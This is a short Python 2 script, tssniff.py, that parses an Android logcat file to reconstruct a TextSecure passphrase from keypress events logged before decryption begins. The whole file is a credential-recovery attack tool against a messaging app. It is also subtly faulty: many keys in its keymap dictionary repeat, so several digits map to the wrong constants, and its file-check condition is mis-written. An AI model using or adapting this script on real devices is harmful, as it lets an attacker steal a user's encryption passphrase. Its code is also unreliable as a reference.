# tssniff.py
# todo: only search for scancodes between PassphrasePromptActivity (<- incomplete) and DecryptingQueue (<- complete)

import sys

# http://developer.android.com/reference/android/view/KeyEvent.html
keymap = {'0':'ACTION_DOWN',
'0':'KEYCODE_UNKNOWN',
'1':'ACTION_UP',
'1':'FLAG_WOKE_HERE',
'1':'KEYCODE_SOFT_LEFT',
'1':'META_SHIFT_ON',
'2':'ACTION_MULTIPLE',
'2':'FLAG_SOFT_KEYBOARD',
'2':'KEYCODE_SOFT_RIGHT',
'2':'META_ALT_ON',
'3':'KEYCODE_HOME',
'4':'FLAG_KEEP_TOUCH_MODE',
'4':'KEYCODE_BACK',
'4':'META_SYM_ON',
'5':'KEYCODE_CALL',
'6':'KEYCODE_ENDCALL',
'7':'0',
'8':'1',
'8':'FLAG_FROM_SYSTEM',
'8':'META_FUNCTION_ON',
'9':'2',
'10':'3',
'11':'4',
'12':'5',
'13':'6',
'14':'7',
'15':'8',
'16':'9',
'16':'FLAG_EDITOR_ACTION',
'16':'META_ALT_LEFT_ON',
'17':'*',
'18':'#',
'19':'KEYCODE_DPAD_UP',
'20':'KEYCODE_DPAD_DOWN',
'21':'KEYCODE_DPAD_LEFT',
'22':'KEYCODE_DPAD_RIGHT',
'23':'KEYCODE_DPAD_CENTER',
'24':'KEYCODE_VOLUME_UP',
'25':'KEYCODE_VOLUME_DOWN',
'26':'KEYCODE_POWER',
'27':'KEYCODE_CAMERA',
'28':'KEYCODE_CLEAR',
'29':'a',
'30':'b',
'31':'c',
'32':'d',
#'32':'FLAG_CANCELED',
#'32':'META_ALT_RIGHT_ON',
'33':'e',
'34':'f',
'35':'g',
'36':'h',
'37':'i',
'38':'j',
'39':'k',
'40':'l',
'41':'m',
'42':'n',
'43':'o',
'44':'p',
'45':'q',
'46':'r',
'47':'s',
'48':'t',
'49':'u',
#'50':'META_ALT_MASK',
'50':'v',
'51':'w',
'52':'x',
'53':'y',
'54':'z',
'55':',',
'56':'.',
'57':'KEYCODE_ALT_LEFT',
'58':'KEYCODE_ALT_RIGHT',
'59':'KEYCODE_SHIFT_LEFT',
'60':'KEYCODE_SHIFT_RIGHT',
'61':'KEYCODE_TAB',
'62':'KEYCODE_SPACE',
'63':'KEYCODE_SYM',
'64':'FLAG_VIRTUAL_HARD_KEY',
'64':'KEYCODE_EXPLORER',
'64':'META_SHIFT_LEFT_ON',
'65':'KEYCODE_ENVELOPE',
'66':'KEYCODE_ENTER',
'67':'KEYCODE_DEL',
'68':'`',
'69':'-',
'70':'=',
'71':'[',
'72':']',
'73':'\\',
'74':';',
'75':'\'',
'76':'/',
'77':'@',
'78':'KEYCODE_NUM',
'79':'KEYCODE_HEADSETHOOK',
'80':'KEYCODE_FOCUS',
'81':'+',
'82':'KEYCODE_MENU',
'83':'KEYCODE_NOTIFICATION',
'84':'KEYCODE_SEARCH',
'84':'MAX_KEYCODE',
'85':'KEYCODE_MEDIA_PLAY_PAUSE',
'86':'KEYCODE_MEDIA_STOP',
'87':'KEYCODE_MEDIA_NEXT',
'88':'KEYCODE_MEDIA_PREVIOUS',
'89':'KEYCODE_MEDIA_REWIND',
'90':'KEYCODE_MEDIA_FAST_FORWARD',
'91':'KEYCODE_MUTE',
'92':'KEYCODE_PAGE_UP',
'93':'KEYCODE_PAGE_DOWN',
'94':'KEYCODE_PICTSYMBOLS',
'95':'KEYCODE_SWITCH_CHARSET',
'96':'KEYCODE_BUTTON_A',
'97':'KEYCODE_BUTTON_B',
'98':'KEYCODE_BUTTON_C',
'99':'KEYCODE_BUTTON_X',
'100':'KEYCODE_BUTTON_Y',
'101':'KEYCODE_BUTTON_Z',
'102':'KEYCODE_BUTTON_L1',
'103':'KEYCODE_BUTTON_R1',
'104':'KEYCODE_BUTTON_L2',
'105':'KEYCODE_BUTTON_R2',
'106':'KEYCODE_BUTTON_THUMBL',
'107':'KEYCODE_BUTTON_THUMBR',
'108':'KEYCODE_BUTTON_START',
'109':'KEYCODE_BUTTON_SELECT',
'110':'KEYCODE_BUTTON_MODE',
'111':'KEYCODE_ESCAPE',
'112':'KEYCODE_FORWARD_DEL',
'113':'KEYCODE_CTRL_LEFT',
'114':'KEYCODE_CTRL_RIGHT',
'115':'KEYCODE_CAPS_LOCK',
'116':'KEYCODE_SCROLL_LOCK',
'117':'KEYCODE_META_LEFT',
'118':'KEYCODE_META_RIGHT',
'119':'KEYCODE_FUNCTION',
'120':'KEYCODE_SYSRQ',
'121':'KEYCODE_BREAK',
'122':'KEYCODE_MOVE_HOME',
'123':'KEYCODE_MOVE_END',
'124':'KEYCODE_INSERT',
'125':'KEYCODE_FORWARD',
'126':'KEYCODE_MEDIA_PLAY',
'127':'KEYCODE_MEDIA_PAUSE',
'128':'FLAG_LONG_PRESS',
'128':'KEYCODE_MEDIA_CLOSE',
'128':'META_SHIFT_RIGHT_ON',
'129':'KEYCODE_MEDIA_EJECT',
'130':'KEYCODE_MEDIA_RECORD',
'131':'KEYCODE_F1',
'132':'KEYCODE_F2',
'133':'KEYCODE_F3',
'134':'KEYCODE_F4',
'135':'KEYCODE_F5',
'136':'KEYCODE_F6',
'137':'KEYCODE_F7',
'138':'KEYCODE_F8',
'139':'KEYCODE_F9',
'140':'KEYCODE_F10',
'141':'KEYCODE_F11',
'142':'KEYCODE_F12',
'143':'KEYCODE_NUM_LOCK',
'144':'0',
'145':'1',
'146':'2',
'147':'3',
'148':'4',
'149':'5',
'150':'6',
'151':'7',
'152':'8',
'153':'9',
'154':'/',
'155':'*',
'156':'-',
'157':'+',
'158':'.',
'159':',',
'160':'KEYCODE_NUMPAD_ENTER',
'161':'=',
'162':'(',
'163':')',
'164':'KEYCODE_VOLUME_MUTE',
'165':'KEYCODE_INFO',
'166':'KEYCODE_CHANNEL_UP',
'167':'KEYCODE_CHANNEL_DOWN',
'168':'KEYCODE_ZOOM_IN',
'169':'KEYCODE_ZOOM_OUT',
'170':'KEYCODE_TV',
'171':'KEYCODE_WINDOW',
'172':'KEYCODE_GUIDE',
'173':'KEYCODE_DVR',
'174':'KEYCODE_BOOKMARK',
'175':'KEYCODE_CAPTIONS',
'176':'KEYCODE_SETTINGS',
'177':'KEYCODE_TV_POWER',
'178':'KEYCODE_TV_INPUT',
'179':'KEYCODE_STB_POWER',
'180':'KEYCODE_STB_INPUT',
'181':'KEYCODE_AVR_POWER',
'182':'KEYCODE_AVR_INPUT',
'183':'KEYCODE_PROG_RED',
'184':'KEYCODE_PROG_GREEN',
'185':'KEYCODE_PROG_YELLOW',
'186':'KEYCODE_PROG_BLUE',
'187':'KEYCODE_APP_SWITCH',
'188':'KEYCODE_BUTTON_1',
'189':'KEYCODE_BUTTON_2',
'190':'KEYCODE_BUTTON_3',
'191':'KEYCODE_BUTTON_4',
'192':'KEYCODE_BUTTON_5',
'193':'KEYCODE_BUTTON_6',
'193':'META_SHIFT_MASK',
'194':'KEYCODE_BUTTON_7',
'195':'KEYCODE_BUTTON_8',
'196':'KEYCODE_BUTTON_9',
'197':'KEYCODE_BUTTON_10',
'198':'KEYCODE_BUTTON_11',
'199':'KEYCODE_BUTTON_12',
'200':'KEYCODE_BUTTON_13',
'201':'KEYCODE_BUTTON_14',
'202':'KEYCODE_BUTTON_15',
'203':'KEYCODE_BUTTON_16',
'204':'KEYCODE_LANGUAGE_SWITCH',
'205':'KEYCODE_MANNER_MODE',
'206':'KEYCODE_3D_MODE',
'207':'KEYCODE_CONTACTS',
'208':'KEYCODE_CALENDAR',
'209':'KEYCODE_MUSIC',
'210':'KEYCODE_CALCULATOR',
'211':'KEYCODE_ZENKAKU_HANKAKU',
'212':'KEYCODE_EISU',
'213':'KEYCODE_MUHENKAN',
'214':'KEYCODE_HENKAN',
'215':'KEYCODE_KATAKANA_HIRAGANA',
'216':'KEYCODE_YEN',
'217':'KEYCODE_RO',
'218':'KEYCODE_KANA',
'219':'KEYCODE_ASSIST',
'256':'FLAG_CANCELED_LONG_PRESS',
'512':'FLAG_TRACKING',
'1024':'FLAG_FALLBACK',
'4096':'META_CTRL_ON',
'8192':'META_CTRL_LEFT_ON',
'16384':'META_CTRL_RIGHT_ON',
'28672':'META_CTRL_MASK',
'65536':'META_META_ON',
'131072':'META_META_LEFT_ON',
'262144':'META_META_RIGHT_ON',
'458752':'META_META_MASK',
'1048576':'META_CAPS_LOCK_ON',
'2097152':'META_NUM_LOCK_ON',
'4194304':'META_SCROLL_LOCK_ON'}

argc = len(sys.argv)
keycodes = []
keys = []
filename = 'logcat'

if argc == 2:
	filename = sys.argv[1]
if argc > 2:
	print 'usage: tssniff.py [filename (default=\'logcat\')]'
	sys.exit(0)

if not 'PassphrasePromptActivity' or not 'DecryptingQueue' in open(filename, 'r').read():
	print 'logfile does not appear to contain a valid TextSecure passphrase'
	sys.exit(0)

# grab keycode constants from logfile
with open(filename, 'r') as log:
		for line in log:
			if 'keyCode=' in line:
				keycodes.append(line.split("=")[1].rstrip())
			if 'DecryptingQueue' in line:
				break
		
if not keycodes:
	print 'no keypresses found in file ' + filename
	sys.exit(0)
	
# convert keycode constants to readable values
for c in keycodes:
	keys.append(keymap[c])
		
print keys